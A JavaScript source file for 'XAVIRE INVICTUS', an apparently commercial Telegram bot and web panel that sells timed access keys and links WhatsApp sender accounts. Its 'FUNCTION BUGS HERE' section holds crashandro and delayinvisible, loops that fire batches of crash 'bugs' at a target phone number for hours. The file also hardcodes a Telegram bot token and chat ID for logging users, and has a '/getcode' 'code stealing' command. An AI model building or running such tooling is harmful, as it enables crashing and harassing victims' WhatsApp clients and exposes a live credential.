<blockquote>「 Information 」</blockquote>
<b>Server : Online</b>
<b>Access Only : Owner</b>
<b>Username : ${username}</b>

<b>「 Settings 」</b>
• /sessions - cek senders user
• /getcode - tools curi code
• /IdentitasSaya
• /BuatAccount
• /ListAccount
• /HapusAccount
• /addowner
• /delowner

<i>Pencet Menu Dibawah Untuk Liat Channel Dev Base:</i>`;

  const keyboard = Markup.keyboard([
    ["📢 Channel"]
  ])
  .resize()
  .oneTime(false);

  try {
    await ctx.reply(teks, {
      parse_mode: "HTML",
      reply_markup: keyboard.reply_markup,
    });
  } catch (err) {
    console.error("Gagal mengirim pesan start:", err);
    // Fallback jika HTML tetap error, kirim teks biasa tanpa format
    await ctx.reply("Terjadi kesalahan format. Berikut menu Anda:\n" + teks.replace(/<[^>]*>/g, ''));
  }
});

bot.hears("🟥Bot Off", async (ctx) => {
  const indictiveMenu = `
<blockquote>Server Bot Telah Di matikan oleh owner</blockquote>
<i>These are some settings menu</i>
`;

  // Kirim pesan baru dengan inline keyboard untuk back
  await ctx.reply(indictiveMenu, {
    parse_mode: "HTML",
    reply_markup: Markup.inlineKeyboard([
      [ Markup.button.url("𝐈𝐍𝐃𝐈𝐂𝐓𝐈𝐕𝐄 𝐂𝐎𝐑𝐄", "https://t.me/AboutinformasiDanzz") ]
    ]).reply_markup
  });
});

bot.hears("ℹ️ Bot Info", async (ctx) => {
  const infoText = `
<blockquote>🤖 Bot Information</blockquote>
<b>XAVIRE INVICTUS NEW VERSION</b>
<i>Advanced multi-functional bot with enhanced security features and latest tools.</i>

<b>🔧 Features:</b>
• User Management
• Access Control
• Multi-tool Integration
• Secure Operations

<b>📞 Support:</b>
Contact @DannzzNew for assistance
`;

  await ctx.reply(infoText, {
    parse_mode: "HTML",
    reply_markup: Markup.inlineKeyboard([
      [ Markup.button.url("𝐈𝐍𝐃𝐈𝐂𝐓𝐈𝐕𝐄 𝐂𝐎𝐑𝐄", "https://t.me/AboutinformasiDanzz") ]
    ]).reply_markup
  });
});

bot.hears("💬 Chat", (ctx) => {
  ctx.reply("💬 Chat dengan developer: https://t.me/DannzzNew");
});

bot.hears("📢 Channel", (ctx) => {
  ctx.reply("📢 Channel Resmi Dev Base: https://t.me/DanzzSlowz");
});

// Handler untuk inline keyboard (tetap seperti semula)
bot.action("show_indictive_menu", async (ctx) => {
  const indictiveMenu = `
<blockquote>🍁 XAVIRE INVICTUS NEW VERSION</blockquote>
<i>These are some settings menu</i>

<b>🔑 Settings Menu</b>
• /connect
• /listsender
• /delsender
• /BuatAccount
• /ListAccount
• /HapusAccount
• /addowner
• /delowner
• /IdentitasSaya
`;

  const keyboard = Markup.inlineKeyboard([
    [ Markup.button.url("𝐈𝐍𝐃𝐈𝐂𝐓𝐈𝐕𝐄 𝐂𝐎𝐑𝐄", "https://t.me/AboutinformasiDanzz") ]
  ]);

  await ctx.editMessageText(indictiveMenu, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

bot.action("show_bot_info", async (ctx) => {
  const infoText = `
<blockquote>🤖 Bot Information</blockquote>
<b>XAVIRE INVICTUS NEW VERSION</b>
<i>Advanced multi-functional bot with enhanced security features and latest tools.</i>

<b>🔧 Features:</b>
• User Management
• Access Control
• Multi-tool Integration
• Secure Operations

<b>📞 Support:</b>
Contact @DannzzNew for assistance
`;

  const keyboard = Markup.inlineKeyboard([
    [ Markup.button.url("𝐈𝐍𝐃𝐈𝐂𝐓𝐈𝐕𝐄 𝐂𝐎𝐑𝐄", "https://t.me/AboutinformasiDanzz") ]
  ]);

  await ctx.editMessageText(infoText, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

bot.action("back_to_main", async (ctx) => {
  const username = ctx.from.username || ctx.from.first_name || "Unknown";
  
  const teks = `
<blockquote>🍁 XAVIRE INVICTUS NEW VERSION</blockquote>
<i>Now DictiveCore has been updated</i>
<i>latest styles, lots of tools, and improved security system</i>

<blockquote>「 Information 」</blockquote>
<b>Developer : @DannzzNew</b>
<b>Version   : 3 ⧸ <code>III</code></b>
<b>Username  : ${username}</b>

<i>Silakan pilih menu di bawah untuk mengakses fitur bot:</i>
`;

  const keyboard = Markup.keyboard([
    ["🔑 Settings Menu"],
    ["ℹ️ Bot Info", "💬 Chat"],
    ["📢 Channel"]
  ])
  .resize()
  .oneTime(false);

  // Edit pesan yang ada untuk kembali ke menu utama
  await ctx.editMessageText(teks, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

// command apalah terserah
// Command untuk mematikan bot

bot.command("sessions", (ctx) => {
  const userSessions = loadUserSessions();
  const activeSessions = sessions.size;
  
  let message = `📊 **Session Status**\n\n`;
  message += `**Active Sessions:** ${activeSessions}\n`;
  message += `**Registered Users:** ${Object.keys(userSessions).length}\n\n`;
  
  Object.entries(userSessions).forEach(([username, numbers]) => {
    message += `**${username}:** ${numbers.length} sender(s)\n`;
    numbers.forEach(number => {
      const isActive = sessions.has(number);
      message += `  - ${number} ${isActive ? '✅' : '❌'}\n`;
    });
  });
  
  ctx.reply(message, { parse_mode: "Markdown" });
});

bot.command("BuatAccount", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak. Hanya Owner yang bisa menggunakan command ini.");
  }

  if (!args || !args.includes(",")) {
    return ctx.reply("✗ Format: /BuatAccount <username>,<durasi>,<role>\n\nContoh:\n• /BuatAccount Danzzi,3d,admin\n• /BuatAccount Danzz,7d,reseller\n• /BuatAccount Danzz,1d,user\n\nRole: owner, admin, reseller, user");
  }

  const parts = args.split(",");
  const username = parts[0].trim();
  const durasiStr = parts[1].trim();
  const role = parts[2] ? parts[2].trim().toLowerCase() : 'user';

  // Validasi role
  const validRoles = ['owner', 'admin', 'reseller', 'user'];
  if (!validRoles.includes(role)) {
    return ctx.reply(`✗ Role tidak valid! Role yang tersedia: ${validRoles.join(', ')}`);
  }

  const durationMs = parseDuration(durasiStr);
  if (!durationMs) return ctx.reply("✗ Format durasi salah! Gunakan contoh: 7d / 1d / 12h");

  const key = generateKey(4);
  const expired = Date.now() + durationMs;
  const users = getUsers();

  const userIndex = users.findIndex(u => u.username === username);
  if (userIndex !== -1) {
    users[userIndex] = { ...users[userIndex], key, expired, role };
  } else {
    users.push({ username, key, expired, role });
  }

  saveUsers(users);

  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    timeZone: "Asia/Jakarta"
  });

  await ctx.reply(
    `✅ <b>Key dengan Role berhasil dibuat:</b>\n\n` +
    `<b>Username:</b> <code>${username}</code>\n` +
    `<b>Key:</b> <code>${key}</code>\n` +
    `<b>Role:</b> <code>${role.toUpperCase()}</code>\n` +
    `<b>Expired:</b> <i>${expiredStr}</i> WIB`,
    { parse_mode: "HTML" }
  );
});

bot.command("ListAccount", async (ctx) => {
  const userId = ctx.from.id.toString();
  const users = getUsers();

  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }

  if (users.length === 0) return ctx.reply("💢 No keys have been created yet.");

  let teks = `🟢 Active Key List:\n\n`;

  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });
    teks += `${i + 1}. ${u.username}\nKey: ${u.key}\nRole: ${u.role || 'user'}\nExpired: ${exp} WIB\n\n`;
  });

  await ctx.reply(teks);
});

bot.command("HapusAccount", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ❗ ] - Akses hanya untuk Owner - tidak bisa sembarang orang bisa mengakses fitur ini.");
  }
  
  if (!username) return ctx.reply("❗Enter username!\nExample: /HapusAccount Danzz");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply(`✗ Username \`${username}\` not found.`, { parse_mode: "HTML" });

  users.splice(index, 1);
  saveUsers(users);
  ctx.reply(`✓ Key belonging to ${username} was successfully deleted.`, { parse_mode: "HTML" });
});

bot.command("connect", async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (!isOwner(userId)) {
        return ctx.reply("[ ❗ ] - Only Owner can connect staff sender.");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("Format: /connect <number>\nExample: /connect 1234567890 (US)\n/connect 447123456789 (UK)\n/connect 628123456789 (Indonesia)");
    }

    let number = args[1].replace(/\D/g, '');
    
    if (number.startsWith('0')) {
        number = number.substring(1);
    }
    
    // Pastikan fungsi ini sudah kamu tambahkan di index.js sebelumnya
    if (typeof isValidPhoneNumber !== 'function' || !isValidPhoneNumber(number)) {
        return ctx.reply("❌ Invalid phone number format.\n\n• Minimum 8 digits\n• Maximum 15 digits\n• No leading 0\n• All countries supported");
    }
    
    // Mengambil info negara dari fungsi yang kita buat tadi
    const countryInfo = getCountryFromNumber(number);
    
    // Memberi tahu user bahwa proses sedang berjalan agar mereka tidak bingung
    const statusMsg = await ctx.reply(`⏳ Menghubungkan ke WhatsApp (${countryInfo.emoji} ${countryInfo.name})...\nMohon tunggu sebentar.`);
    
    try {
        // Proses ini yang sering menyebabkan Timeout 90 detik
        const sock = await connectToWhatsAppStaff(ctx, number);
        
        if (sock) {
            const userSessions = loadUserSessions();
            const username = `staff_${ctx.from.id}`;
            const staffSenders = userSessions[username] || [];
            
            await ctx.reply(
                `🎉 *Staff Sender Setup Complete!*\n\n` +
                `🌍 *Country:* ${countryInfo.emoji} ${countryInfo.name}\n` +
                `📱 *Sender:* ${number}\n` +
                `👤 *Staff ID:* ${ctx.from.id}\n` +
                `🔗 *Status:* Connected ✅\n` +
                `📊 *Total Staff Senders:* ${staffSenders.length}\n\n` +
                `_This sender will auto-reconnect after panel restart._`,
                { parse_mode: "Markdown" }
            );
        }
    } catch (error) {
        console.error("Connect Error:", error);
        
        // Penanganan spesifik jika terjadi timeout
        if (error.message.includes('timeout') || error.message.includes('90000')) {
            await ctx.reply(`❌ *Connection Timeout*\n\nServer WhatsApp tidak merespons dalam 90 detik. Ini biasanya terjadi jika:\n1. Nomor tidak aktif di WA.\n2. Server hosting sedang overload.\n3. Terlalu banyak request pairing.\n\nSilakan coba lagi beberapa saat lagi.`, { parse_mode: "Markdown" });
        } else {
            await ctx.reply(`❌ Failed to connect: ${error.message}`);
        }
    }
});

bot.command("staffsenders", async (ctx) => {
  const userId = ctx.from.id.toString();
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Only Owner can view staff senders.");
  }

  const userSessions = loadUserSessions();
  let staffSenders = [];
  
  for (const [username, numbers] of Object.entries(userSessions)) {
    if (username.startsWith('staff_')) {
      const staffId = username.replace('staff_', '');
      numbers.forEach(number => {
        staffSenders.push({
          staffId: staffId,
          number: number,
          connected: sessions.has(number)
        });
      });
    }
  }
  
  if (staffSenders.length === 0) {
    return ctx.reply("No staff senders found.");
  }
  
  let message = `📂 *STAFF SENDERS* (${staffSenders.length})\n\n`;
  
  staffSenders.forEach((sender, index) => {
    message += `${index + 1}. ${sender.number}\n`;
    message += `   👤 Staff: ${sender.staffId}\n`;
    message += `   🔗 Status: ${sender.connected ? '✅ Connected' : '❌ Disconnected'}\n\n`;
  });
  
  message += `_Auto-reload: Active ✅_`;
  
  await ctx.reply(message, { parse_mode: "Markdown" });
});

bot.command("reconnectstaff", async (ctx) => {
  const userId = ctx.from.id.toString();
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Only Owner can reconnect staff.");
  }

  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("Format: /reconnectstaff <number>\nExample: /reconnectstaff 628123456789");
  }

  let number = args[1].replace(/\D/g, '');
  
  try {
    await ctx.reply(`🔄 Reconnecting staff sender ${number}...`);
    
    const userSessions = loadUserSessions();
    let staffUsername = null;
    
    for (const [username, numbers] of Object.entries(userSessions)) {
      if (username.startsWith('staff_') && numbers.includes(number)) {
        staffUsername = username;
        break;
      }
    }
    
    if (!staffUsername) {
      return ctx.reply(`❌ No staff found with sender ${number}`);
    }
    
    const sessionDir = userSessionPath(staffUsername, number);
    
    await reconnectStaffBackground(staffUsername, number, sessionDir);
    await ctx.reply(`✅ Staff sender ${number} reconnected successfully!`);
    
  } catch (error) {
    await ctx.reply(`❌ Failed to reconnect: ${error.message}`);
  }
});

bot.command("IdentitasSaya", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.from.username || ctx.from.first_name || "User";
  
  let role = "User";
  if (isOwner(userId)) {
    role = "Owner";
  } else if (isModerator(userId)) {
    role = "Admin";
  } else if (isReseller(userId)) {
    role = "Reseller";
  } else if (isAuthorized(userId)) {
    role = "Authorized User";
  }
  
  ctx.reply(`
👤 <b>Role Information</b>

🆔 <b>User:</b> ${username}
🎭 <b>Bot Role:</b> ${role}
💻 <b>User ID:</b> <code>${userId}</code>

<i>Gunakan /BuatAccount di bot untuk membuat key dengan role tertentu (Owner only)</i>
  `, { parse_mode: "HTML" });
});

/* simpen aja dlu soalnya ga guna
bot.command("addacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /addacces 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();
  if (data.akses.includes(id)) return ctx.reply("✓ User already has access.");

  data.akses.push(id);
  saveAkses(data);
  ctx.reply(`✓ Access granted to ID: ${id}`);
});

bot.command("delacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /delacces 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();
  if (!data.akses.includes(id)) return ctx.reply("✗ User not found.");

  data.akses = data.akses.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`✓ Access to user ID ${id} removed.`);
});*/

bot.command("addowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /addowner 12345678", { parse_mode: "HTML" });

  const data = loadAkses();
  if (data.owners.includes(id)) return ctx.reply("✗ Already an owner.");

  data.owners.push(id);
  saveAkses(data);
  ctx.reply(`✓ New owner added: ${id}`);
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /delowner 12345678", { parse_mode: "HTML" });

  const data = loadAkses();

  if (!data.owners.includes(id)) return ctx.reply("✗ Not the owner.");

  data.owners = data.owners.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ Owner ID ${id} was successfully deleted.`);
});

bot.command("getcode", async (ctx) => {
    const chatId = ctx.chat.id;
    const input = ctx.message.text.split(" ").slice(1).join(" ").trim();

    if (!input) {
        return ctx.reply("❌ Missing input. Please provide a website URL.\n\nExample:\n/getcode https://example.com");
    }

    const url = input;

    try {
        const apiUrl = `https://api.nvidiabotz.xyz/tools/getcode?url=${encodeURIComponent(url)}`;
        const res = await fetch(apiUrl);
        const data = await res.json();

        if (!data || !data.result) {
            return ctx.reply("❌ Failed to fetch source code. Please check the URL.");
        }

        const code = data.result;

        if (code.length > 4000) {
            // simpan ke file sementara
            const filePath = `sourcecode_${Date.now()}.html`;
            fs.writeFileSync(filePath, code);

            await ctx.replyWithDocument({ source: filePath, filename: `sourcecode.html` }, { caption: `📄 Full source code from: ${url}` });

            fs.unlinkSync(filePath); // hapus file setelah dikirim
        } else {
            await ctx.replyWithHTML(`📄 Source Code from: ${url}\n\n<code>${code}</code>`);
        }
    } catch (err) {
        console.error("GetCode API Error:", err);
        ctx.reply("❌ Error fetching website source code. Please try again later.");
    }
});

console.clear();
console.log(chalk.bold.white(`\n
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⠄⠀⡐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡈⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠄⠀⠀⠀⠀⠈⠙⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⡶⠦⣠⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠈⣟⠲⡎⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡰⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠄⢂⠀⠀⠀⠀⠀⣀⣠⠠⢖⣋⡥⢖⣩⠔⠊⠀⠀
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣨⠭⢵⣒⣩⠬⢖⠏⠁⢀⣀⠀⠀⠀
⠀⠀⠈⠓⠒⠦⠍⠭⠭⣭⠭⠭⠭⠭⡿⡓⠒⠛⠉⠉⠀⠀⣠⠇⠀⠀⠘⠞⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠁⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠿⠀⠀⠀⠀⠀⠉⠉⠙⠒⠒⠚⠉⠁⠀⠀⠀⠁⢣⡎⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
`))

console.log(chalk.cyanBright(`
─────────────────────────────────────
AUTHOR BASE     : Danzz/@DannzzNew
ID OWN APPS     : ${ownerIds}
VERSION BASE   : V6 NEW
─────────────────────────────────────\n\n`));

bot.launch();

// Si anjing sialan ini yang bikin gw pusing 
setTimeout(() => {
  console.log('🔄 Starting auto-reload activated');
  forceReloadWithRetry();
}, 15000);

// nambahin periodic health check biar aman aja
setInterval(() => {
  const activeSessions = sessions.size;
  const userSessions = loadUserSessions();
  const totalRegisteredSessions = Object.values(userSessions).reduce((acc, numbers) => acc + numbers.length, 0);
  
  console.log(`📊 Health Check: ${activeSessions}/${totalRegisteredSessions} sessions active`);
  
  // Only attempt reload if we have registered sessions but none are active
  if (totalRegisteredSessions > 0 && activeSessions === 0) {
    console.log('🔄 Health check: Found registered sessions but none active, attempting reload...');
    reloadAttempts = 0; // Reset counter
    forceReloadWithRetry();
  } else if (activeSessions > 0) {
    console.log('✅ Health check: Sessions are active');
  }
}, 10 * 60 * 1000); // Check setiap 10 menit

// ================ FUNCTION BUGS HERE ================== \\
async function delayinvisible(sock, durationHours, X) {
  if (!sock) {
    console.error('❌ Socket tidak tersedia untuk delaylow');
    return;
  }

  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      return;
    }

    try {
      if (count < 30) {
        await Promise.all([
          protocolbug19(sock, X),
          delayloww(sock, X),
          sleep(500)
        ]);
        
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/30 delaylow 📟
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
      } else {
        console.log(chalk.green(`👀 Success Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( 🍷 Indictive | Core V3 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

async function crashandro(sock, durationHours, X) {
  if (!sock) {
    console.error('❌ Socket tidak tersedia untuk delaylow');
    return;
  }

  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      return;
    }

    try {
      if (count < 30) {
        await Promise.all([
          N3xithBlank(sock, X),
          amountOne(sock, X),
          sleep(500)
        ]);
        
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/30 delaylow 📟
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
      } else {
        console.log(chalk.green(`👀 Success Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( 🍷 Indictive | Core V3 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

// Middleware untuk parsing JSON
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(express.json());
app.use(express.static('public'));

// ==================== AUTH MIDDLEWARE ==================== //
function requireAuth(req, res, next) {
  const username = req.cookies.sessionUser;
  
  if (!username) {
    return res.redirect("/login?msg=Silakan login terlebih dahulu");
  }
  
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }
  
  if (Date.now() > currentUser.expired) {
    return res.redirect("/login?msg=Session expired, login ulang");
  }

  // PENTING: Simpan data user agar bisa dibaca di route app.get
  req.user = currentUser; 
  
  next();
}

app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "XAVIRE INVICTUS", "login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca Login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  const filePath = path.join(__dirname, "XAVIRE INVICTUS", "login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca file Login.html");
    res.send(html);
  });
});

app.post("/auth", (req, res) => {
  const { username, key } = req.body;
  const users = getUsers();

  const user = users.find(u => u.username === username && u.key === key);
  if (!user) {
    return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
  }

  res.cookie("sessionUser", username, { maxAge: 60 * 60 * 1000 }); 
  res.redirect("/dashboard");
});

// Tambahkan auth middleware untuk WiFi Killer
app.get("/dashboard", requireAuth, (req, res) => {
    const filePath = path.join(__dirname, 'XAVIRE INVICTUS', 'dashboard.html');

    fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) {
            console.error(err);
            return res.status(500).send("Gagal memuat halaman dashboard");
        }

        const users = getUsers(); 
        const userCount = users.length.toString();
        const senderCount = "1"; 

        // Ambil data user spesifik yang sedang login
        const currentUser = users.find(u => u.username === req.user.username);
        
        // --- LOGIKA EXPIRED DATE ---
        let expiredStatus = "Permanent";
        if (currentUser && currentUser.expired) {
            const now = new Date();
            const expDate = new Date(currentUser.expired);
            
            if (now > expDate) {
                expiredStatus = "Expired";
                // Opsional: res.redirect('/expired-page'); 
            } else {
                // Menghitung sisa hari
                const diffTime = Math.abs(expDate - now);
                const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24)); 
                expiredStatus = `${diffDays} Hari Lagi`;
            }
        }
        // ---------------------------

        const username = req.user.username;
        const role = req.user.role || "Member";

        let result = data
            .replace(/\${username}/g, username)
            .replace(/\${role}/g, role)
            .replace(/\${userOnline}/g, userCount)
            .replace(/\${senderAktif}/g, senderCount)
            .replace(/\${expiredDate}/g, expiredStatus); // Inject ke HTML

        res.send(result);
    });
});

// Route untuk dashboard
app.get("/tools", requireAuth, (req, res) => {
    const filePath = path.join(__dirname, 'XAVIRE INVICTUS', 'tools.html');

    fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) {
            console.error(err);
            return res.status(500).send("Gagal memuat halaman dashboard");
        }

        const users = getUsers(); 
        const userCount = users.length.toString();
        const senderCount = "1"; 

        // Ambil data user spesifik yang sedang login
        const currentUser = users.find(u => u.username === req.user.username);
        
        // --- LOGIKA EXPIRED DATE ---
        let expiredStatus = "Permanent";
        if (currentUser && currentUser.expired) {
            const now = new Date();
            const expDate = new Date(currentUser.expired);
            
            if (now > expDate) {
                expiredStatus = "Expired";
                // Opsional: res.redirect('/expired-page'); 
            } else {
                // Menghitung sisa hari
                const diffTime = Math.abs(expDate - now);
                const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24)); 
                expiredStatus = `${diffDays} Hari Lagi`;
            }
        }
        // ---------------------------

        const username = req.user.username;
        const role = req.user.role || "Member";

        let result = data
            .replace(/\${username}/g, username)
            .replace(/\${role}/g, role)
        res.send(result);
    });
});
// Endpoint untuk mendapatkan data user dan session
app.get("/api/option-data", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);

  if (!currentUser) {
    return res.status(404).json({ error: "User not found" });
  }

  // Ambil role dari data user
  const userRole = currentUser.role || 'user';

  // Format expired time
  const expired = new Date(currentUser.expired).toLocaleString("id-ID", {
    timeZone: "Asia/Jakarta",
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
  });

  // Hitung waktu tersisa
  const now = Date.now();
  const timeRemaining = currentUser.expired - now;
  const daysRemaining = Math.max(0, Math.floor(timeRemaining / (1000 * 60 * 60 * 24)));

  res.json({
    username: currentUser.username,
    role: userRole,
    activeSenders: sessions.size,
    expired: expired,
    daysRemaining: daysRemaining
  });
});

app.get("/sender", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "XAVIRE INVICTUS", "sender.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/anime", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "XAVIRE INVICTUS", "anime.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});
      
/* 
USER DETECTIONS - HARAP DI BACA !!!
MASUKIN BOT TOKEN TELE LU DAN ID TELE LU ATAU ID GROUP TELEL LU

Gunanya buat apa bang?
itu kalo ada user yang make fitur bug nanti si bot bakal ngirim log history nya ke id telelu, kalo pake id GC tele lu, nanti ngirim history nya ke GC tele lu bisa lu atur aja mau ngirim nya ke mana ID / ID GC
*/
const BOT_TOKEN = "7903358806:AAFkZcHHbkehAmnL83F4D_LiaV-UdiKa4M8";
const CHAT_ID = "7250235697";
// simpan waktu terakhir eksekusi (global cooldown)
let lastExecution = 0;

// INI JANGAN DI APA APAIN
app.get("/execution", async (req, res) => {
  try {
    const username = req.cookies.sessionUser;

    if (!username) {
      return res.redirect("/login?msg=Silakan login terlebih dahulu");
    }

    const users = getUsers();
    const currentUser = users.find(u => u.username === username);

    // Pastikan session valid
    if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
      return res.redirect("/login?msg=Session expired, login ulang");
    }

    const role = currentUser.role || "User";
    const expiredDate = new Date(currentUser.expired).toLocaleString("id-ID");
    const isAdminOrOwner = role.toLowerCase() === "admin" || role.toLowerCase() === "owner";

    const userSessions = loadUserSessions();
    let activeUserSenders = [];

    // --- LOGIKA SENDER BERDASARKAN ROLE (index2.js logic) ---
    if (isAdminOrOwner) {
      // Ambil sender milik sendiri + sender dari semua akun staff
      const allNumbers = [];
      
      for (const [sessUser, numbers] of Object.entries(userSessions)) {
        // Tambahkan jika itu miliknya sendiri atau milik staff_
        if (sessUser === username || sessUser.startsWith("staff_")) {
          allNumbers.push(...numbers);
        }
      }
      
      // Filter hanya yang sedang terkoneksi di Map sessions
      activeUserSenders = [...new Set(allNumbers)].filter(num => sessions.has(num));
    } else {
      // User biasa hanya bisa melihat sender miliknya sendiri yang aktif
      const myNumbers = userSessions[username] || [];
      activeUserSenders = myNumbers.filter(num => sessions.has(num));
    }

    const justExecuted = req.query.justExecuted === 'true';
    const targetNumber = req.query.target || '';
    const mode = req.query.mode || '';

